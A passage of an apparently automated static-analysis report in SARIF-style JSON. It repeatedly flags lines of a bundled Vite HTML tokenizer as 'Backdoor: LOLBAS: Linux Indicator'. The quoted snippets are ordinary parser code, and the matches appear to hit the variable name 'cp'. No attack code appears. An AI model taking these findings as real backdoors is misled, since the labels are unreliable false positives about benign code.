                      "text": "            this.charRefCode = this.charRefCode * 16 + cp - 0x37;\n        }\n        else if (isAsciiLowerHexDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x57;\n        }\n        else if (isAsciiDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x30;\n",
                      "markdown": "`            this.charRefCode = this.charRefCode * 16 + cp - 0x37;\n        }\n        else if (isAsciiLowerHexDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x57;\n        }\n        else if (isAsciiDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x30;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 3796,
                  "startColumn": 54,
                  "endLine": 3796,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    //------------------------------------------------------------------\n    _stateHexademicalCharacterReference(cp) {\n        if (isAsciiUpperHexDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x37;\n        }\n        else if (isAsciiLowerHexDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x57;\n",
                    "rendered": {
                      "text": "    //------------------------------------------------------------------\n    _stateHexademicalCharacterReference(cp) {\n        if (isAsciiUpperHexDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x37;\n        }\n        else if (isAsciiLowerHexDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x57;\n",
                      "markdown": "`    //------------------------------------------------------------------\n    _stateHexademicalCharacterReference(cp) {\n        if (isAsciiUpperHexDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x37;\n        }\n        else if (isAsciiLowerHexDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x57;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 3762,
                  "startColumn": 47,
                  "endLine": 3762,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    //------------------------------------------------------------------\n    _stateNumericCharacterReference(cp) {\n        this.charRefCode = 0;\n        if (cp === CODE_POINTS.LATIN_SMALL_X || cp === CODE_POINTS.LATIN_CAPITAL_X) {\n            this.state = State.HEXADEMICAL_CHARACTER_REFERENCE_START;\n        }\n        // Inlined decimal character reference start state\n",
                    "rendered": {
                      "text": "    //------------------------------------------------------------------\n    _stateNumericCharacterReference(cp) {\n        this.charRefCode = 0;\n        if (cp === CODE_POINTS.LATIN_SMALL_X || cp === CODE_POINTS.LATIN_CAPITAL_X) {\n            this.state = State.HEXADEMICAL_CHARACTER_REFERENCE_START;\n        }\n        // Inlined decimal character reference start state\n",
                      "markdown": "`    //------------------------------------------------------------------\n    _stateNumericCharacterReference(cp) {\n        this.charRefCode = 0;\n        if (cp === CODE_POINTS.LATIN_SMALL_X || cp === CODE_POINTS.LATIN_CAPITAL_X) {\n            this.state = State.HEXADEMICAL_CHARACTER_REFERENCE_START;\n        }\n        // Inlined decimal character reference start state\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 2970,
                  "startColumn": 51,
                  "endLine": 2970,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    // Comment less-than sign bang dash dash state\n    //------------------------------------------------------------------\n    _stateCommentLessThanSignBangDashDash(cp) {\n        if (cp !== CODE_POINTS.GREATER_THAN_SIGN && cp !== CODE_POINTS.EOF) {\n            this._err(ERR.nestedComment);\n        }\n        this.state = State.COMMENT_END;\n",
                    "rendered": {
                      "text": "    // Comment less-than sign bang dash dash state\n    //------------------------------------------------------------------\n    _stateCommentLessThanSignBangDashDash(cp) {\n        if (cp !== CODE_POINTS.GREATER_THAN_SIGN && cp !== CODE_POINTS.EOF) {\n            this._err(ERR.nestedComment);\n        }\n        this.state = State.COMMENT_END;\n",
                      "markdown": "`    // Comment less-than sign bang dash dash state\n    //------------------------------------------------------------------\n    _stateCommentLessThanSignBangDashDash(cp) {\n        if (cp !== CODE_POINTS.GREATER_THAN_SIGN && cp !== CODE_POINTS.EOF) {\n            this._err(ERR.nestedComment);\n        }\n        this.state = State.COMMENT_END;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 2087,
                  "startColumn": 13,
                  "endLine": 2087,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        this._createEndTagToken();\n        const token = this.currentToken;\n        token.tagName = this.lastStartTagName;\n        const cp = this.preprocessor.peek(this.lastStartTagName.length);\n        switch (cp) {\n            case CODE_POINTS.SPACE:\n            case CODE_POINTS.LINE_FEED:\n",
                    "rendered": {
                      "text": "        this._createEndTagToken();\n        const token = this.currentToken;\n        token.tagName = this.lastStartTagName;\n        const cp = this.preprocessor.peek(this.lastStartTagName.length);\n        switch (cp) {\n            case CODE_POINTS.SPACE:\n            case CODE_POINTS.LINE_FEED:\n",
                      "markdown": "`        this._createEndTagToken();\n        const token = this.currentToken;\n        token.tagName = this.lastStartTagName;\n        const cp = this.preprocessor.peek(this.lastStartTagName.length);\n        switch (cp) {\n            case CODE_POINTS.SPACE:\n            case CODE_POINTS.LINE_FEED:\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1478,
                  "startColumn": 38,
                  "endLine": 1478,
                  "endColumn": 42,
                  "snippet": {
                    "text": "                                ? [htmlDecodeTree[++i]]\n                                : [htmlDecodeTree[++i], htmlDecodeTree[++i]];\n                    excess = 0;\n                    withoutSemicolon = cp !== CODE_POINTS.SEMICOLON;\n                }\n                if (valueLength === 0) {\n                    // If the value is zero-length, we're done.\n",
                    "rendered": {
                      "text": "                                ? [htmlDecodeTree[++i]]\n                                : [htmlDecodeTree[++i], htmlDecodeTree[++i]];\n                    excess = 0;\n                    withoutSemicolon = cp !== CODE_POINTS.SEMICOLON;\n                }\n                if (valueLength === 0) {\n                    // If the value is zero-length, we're done.\n",
                      "markdown": "`                                ? [htmlDecodeTree[++i]]\n                                : [htmlDecodeTree[++i], htmlDecodeTree[++i]];\n                    excess = 0;\n                    withoutSemicolon = cp !== CODE_POINTS.SEMICOLON;\n                }\n                if (valueLength === 0) {\n                    // If the value is zero-length, we're done.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1447,
                  "startColumn": 60,
                  "endLine": 1447,
                  "endColumn": 64,
                  "snippet": {
                    "text": "        let result = null;\n        let excess = 0;\n        let withoutSemicolon = false;\n        for (let i = 0, current = htmlDecodeTree[0]; i >= 0; cp = this._consume()) {\n            i = determineBranch(htmlDecodeTree, current, i + 1, cp);\n            if (i < 0)\n                break;\n",
                    "rendered": {
                      "text": "        let result = null;\n        let excess = 0;\n        let withoutSemicolon = false;\n        for (let i = 0, current = htmlDecodeTree[0]; i >= 0; cp = this._consume()) {\n            i = determineBranch(htmlDecodeTree, current, i + 1, cp);\n            if (i < 0)\n                break;\n",
                      "markdown": "`        let result = null;\n        let excess = 0;\n        let withoutSemicolon = false;\n        for (let i = 0, current = htmlDecodeTree[0]; i >= 0; cp = this._consume()) {\n            i = determineBranch(htmlDecodeTree, current, i + 1, cp);\n            if (i < 0)\n                break;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1432,
                  "startColumn": 13,
                  "endLine": 1432,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    _emitCodePoint(cp) {\n        const type = isWhitespace(cp)\n            ? TokenType.WHITESPACE_CHARACTER\n            : cp === CODE_POINTS.NULL\n                ? TokenType.NULL_CHARACTER\n                : TokenType.CHARACTER;\n        this._appendCharToCurrentCharacterToken(type, String.fromCodePoint(cp));\n",
                    "rendered": {
                      "text": "    _emitCodePoint(cp) {\n        const type = isWhitespace(cp)\n            ? TokenType.WHITESPACE_CHARACTER\n            : cp === CODE_POINTS.NULL\n                ? TokenType.NULL_CHARACTER\n                : TokenType.CHARACTER;\n        this._appendCharToCurrentCharacterToken(type, String.fromCodePoint(cp));\n",
                      "markdown": "`    _emitCodePoint(cp) {\n        const type = isWhitespace(cp)\n            ? TokenType.WHITESPACE_CHARACTER\n            : cp === CODE_POINTS.NULL\n                ? TokenType.NULL_CHARACTER\n                : TokenType.CHARACTER;\n        this._appendCharToCurrentCharacterToken(type, String.fromCodePoint(cp));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1177,
                  "startColumn": 17,
                  "endLine": 1177,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        this.inLoop = true;\n        while (this.active && !this.paused) {\n            this.consumedAfterSnapshot = 0;\n            const cp = this._consume();\n            if (!this._ensureHibernation()) {\n                this._callState(cp);\n            }\n",
                    "rendered": {
                      "text": "        this.inLoop = true;\n        while (this.active && !this.paused) {\n            this.consumedAfterSnapshot = 0;\n            const cp = this._consume();\n            if (!this._ensureHibernation()) {\n                this._callState(cp);\n            }\n",
                      "markdown": "`        this.inLoop = true;\n        while (this.active && !this.paused) {\n            this.consumedAfterSnapshot = 0;\n            const cp = this._consume();\n            if (!this._ensureHibernation()) {\n                this._callState(cp);\n            }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1123,
                  "startColumn": 60,
                  "endLine": 1123,
                  "endColumn": 64,
                  "snippet": {
                    "text": "    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n}\nfunction isScriptDataDoubleEscapeSequenceEnd(cp) {\n    return isWhitespace(cp) || cp === CODE_POINTS.SOLIDUS || cp === CODE_POINTS.GREATER_THAN_SIGN;\n}\n//Tokenizer\nclass Tokenizer {\n",
                    "rendered": {
                      "text": "    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n}\nfunction isScriptDataDoubleEscapeSequenceEnd(cp) {\n    return isWhitespace(cp) || cp === CODE_POINTS.SOLIDUS || cp === CODE_POINTS.GREATER_THAN_SIGN;\n}\n//Tokenizer\nclass Tokenizer {\n",
                      "markdown": "`    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n}\nfunction isScriptDataDoubleEscapeSequenceEnd(cp) {\n    return isWhitespace(cp) || cp === CODE_POINTS.SOLIDUS || cp === CODE_POINTS.GREATER_THAN_SIGN;\n}\n//Tokenizer\nclass Tokenizer {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1123,
                  "startColumn": 30,
                  "endLine": 1123,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n}\nfunction isScriptDataDoubleEscapeSequenceEnd(cp) {\n    return isWhitespace(cp) || cp === CODE_POINTS.SOLIDUS || cp === CODE_POINTS.GREATER_THAN_SIGN;\n}\n//Tokenizer\nclass Tokenizer {\n",
                    "rendered": {
                      "text": "    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n}\nfunction isScriptDataDoubleEscapeSequenceEnd(cp) {\n    return isWhitespace(cp) || cp === CODE_POINTS.SOLIDUS || cp === CODE_POINTS.GREATER_THAN_SIGN;\n}\n//Tokenizer\nclass Tokenizer {\n",
                      "markdown": "`    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n}\nfunction isScriptDataDoubleEscapeSequenceEnd(cp) {\n    return isWhitespace(cp) || cp === CODE_POINTS.SOLIDUS || cp === CODE_POINTS.GREATER_THAN_SIGN;\n}\n//Tokenizer\nclass Tokenizer {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1117,
                  "startColumn": 103,
                  "endLine": 1117,
                  "endColumn": 107,
                  "snippet": {
                    "text": "    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n",
                    "rendered": {
                      "text": "    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n",
                      "markdown": "`    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1117,
                  "startColumn": 70,
                  "endLine": 1117,
                  "endColumn": 74,
                  "snippet": {
                    "text": "    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n",
                    "rendered": {
                      "text": "    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n",
                      "markdown": "`    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1117,
                  "startColumn": 38,
                  "endLine": 1117,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n",
                    "rendered": {
                      "text": "    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n",
                      "markdown": "`    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1117,
                  "startColumn": 10,
                  "endLine": 1117,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n",
                    "rendered": {
                      "text": "    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n",
                      "markdown": "`    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n}\nfunction isEntityInAttributeInvalidEnd(nextCp) {\n    return nextCp === CODE_POINTS.EQUALS_SIGN || isAsciiAlphaNumeric(nextCp);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1114,
                  "startColumn": 10,
                  "endLine": 1114,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    return isAsciiDigit(cp) || isAsciiUpperHexDigit(cp) || isAsciiLowerHexDigit(cp);\n}\nfunction toAsciiLower(cp) {\n    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n",
                    "rendered": {
                      "text": "    return isAsciiDigit(cp) || isAsciiUpperHexDigit(cp) || isAsciiLowerHexDigit(cp);\n}\nfunction toAsciiLower(cp) {\n    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n",
                      "markdown": "`    return isAsciiDigit(cp) || isAsciiUpperHexDigit(cp) || isAsciiLowerHexDigit(cp);\n}\nfunction toAsciiLower(cp) {\n    return cp + 32;\n}\nfunction isWhitespace(cp) {\n    return cp === CODE_POINTS.SPACE || cp === CODE_POINTS.LINE_FEED || cp === CODE_POINTS.TABULATION || cp === CODE_POINTS.FORM_FEED;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1108,
                  "startColumn": 45,
                  "endLine": 1108,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n}\nfunction isAsciiHexDigit(cp) {\n    return isAsciiDigit(cp) || isAsciiUpperHexDigit(cp) || isAsciiLowerHexDigit(cp);\n",
                    "rendered": {
                      "text": "    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n}\nfunction isAsciiHexDigit(cp) {\n    return isAsciiDigit(cp) || isAsciiUpperHexDigit(cp) || isAsciiLowerHexDigit(cp);\n",
                      "markdown": "`    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n}\nfunction isAsciiHexDigit(cp) {\n    return isAsciiDigit(cp) || isAsciiUpperHexDigit(cp) || isAsciiLowerHexDigit(cp);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1108,
                  "startColumn": 10,
                  "endLine": 1108,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n}\nfunction isAsciiHexDigit(cp) {\n    return isAsciiDigit(cp) || isAsciiUpperHexDigit(cp) || isAsciiLowerHexDigit(cp);\n",
                    "rendered": {
                      "text": "    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n}\nfunction isAsciiHexDigit(cp) {\n    return isAsciiDigit(cp) || isAsciiUpperHexDigit(cp) || isAsciiLowerHexDigit(cp);\n",
                      "markdown": "`    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n}\nfunction isAsciiHexDigit(cp) {\n    return isAsciiDigit(cp) || isAsciiUpperHexDigit(cp) || isAsciiLowerHexDigit(cp);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1105,
                  "startColumn": 47,
                  "endLine": 1105,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    return isAsciiLetter(cp) || isAsciiDigit(cp);\n}\nfunction isAsciiUpperHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n",
                    "rendered": {
